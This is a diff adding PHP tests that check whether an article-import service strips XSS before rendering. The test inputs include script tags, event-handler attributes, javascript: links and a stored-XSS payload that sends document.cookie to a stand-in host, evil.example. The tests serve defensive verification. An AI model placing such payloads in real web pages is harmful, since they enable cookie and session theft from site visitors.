@@ -443,4 +443,84 @@ class AiImportTest extends TestCase
             ->assertSee('Preview')
             ->assertSee('Import');
     }
+
+    // -------------------------------------------------------- XSS sanitization
+
+    public function test_script_tag_in_body_is_stripped_on_import(): void
+    {
+        $result = $this->service()->import($this->validJson([
+            'content' => '<p>Safe text.</p><script>alert(document.cookie)</script>',
+        ]));
+
+        $this->assertNotNull($result['article']);
+        $this->assertStringNotContainsString('<script', $result['article']->body);
+        $this->assertStringContainsString('Safe text.', $result['article']->body);
+    }
+
+    public function test_event_handler_attribute_is_stripped_on_import(): void
+    {
+        $result = $this->service()->import($this->validJson([
+            'content' => '<img src="x.jpg" onerror="alert(1)"><p onclick="steal()">Click me</p>',
+        ]));
+
+        $this->assertNotNull($result['article']);
+        $this->assertStringNotContainsString('onerror', $result['article']->body);
+        $this->assertStringNotContainsString('onclick', $result['article']->body);
+        $this->assertStringContainsString('Click me', $result['article']->body);
+    }
+
+    public function test_javascript_url_in_link_is_stripped_on_import(): void
+    {
+        $result = $this->service()->import($this->validJson([
+            'content' => '<p><a href="javascript:alert(1)">Click here</a></p>',
+        ]));
+
+        $this->assertNotNull($result['article']);
+        $this->assertStringNotContainsString('javascript:', $result['article']->body);
+        $this->assertStringContainsString('Click here', $result['article']->body);
+    }
+
+    public function test_legitimate_rich_content_survives_sanitization_unchanged(): void
+    {
+        // همان نوع تگ‌هایی که یک مقاله‌ی واقعی و امن به‌طور طبیعی دارد — هیچ‌کدام نباید حذف شوند
+        $richBody = '<h2>Heading</h2><p>Some <strong>bold</strong> and <em>italic</em> text with a '
+            .'<a href="https://example.com/guide">link</a>.</p>'
+            .'<ul><li>First point</li><li>Second point</li></ul>'
+            .'<blockquote>A quote.</blockquote>'
+            .'<img src="https://example.com/photo.jpg" alt="A photo" width="600" height="400">'
+            .'<table><tr><td>Cell</td></tr></table>';
+
+        $result = $this->service()->import($this->validJson(['content' => $richBody]));
+
+        $this->assertNotNull($result['article']);
+        $body = $result['article']->body;
+        $this->assertStringContainsString('<h2>Heading</h2>', $body);
+        $this->assertStringContainsString('<strong>bold</strong>', $body);
+        $this->assertStringContainsString('<em>italic</em>', $body);
+        $this->assertStringContainsString('href="https://example.com/guide"', $body);
+        $this->assertStringContainsString('<li>First point</li>', $body);
+        $this->assertStringContainsString('<blockquote>A quote.</blockquote>', $body);
+        $this->assertStringContainsString('src="https://example.com/photo.jpg"', $body);
+        $this->assertStringContainsString('alt="A photo"', $body);
+        $this->assertStringContainsString('<table>', $body);
+    }
+
+    public function test_stored_xss_payload_is_neutralized_when_the_article_page_renders(): void
+    {
+        $result = $this->service()->import($this->validJson([
+            'content' => '<p>Hello.</p><script>document.location="https://evil.example/steal?c="+document.cookie</script>',
+        ]));
+
+        $article = $result['article'];
+        $article->update(['status' => 'published', 'published_at' => now()]);
+
+        $response = $this->get('/blog/'.$article->slug);
+
+        // خودِ صفحه اسکریپت‌های قانونی سراسری دارد (مثل آنالیتیکس)؛ فقط payload مخربِ خاص را
+        // چک می‌کنیم، نه نبودِ مطلقِ هر تگ اسکریپتی روی کل صفحه
+        $response->assertOk();
+        $response->assertDontSee('evil.example', false);
+        $response->assertDontSee('document.cookie', false);
+        $response->assertSee('Hello.', false);
+    }
 }
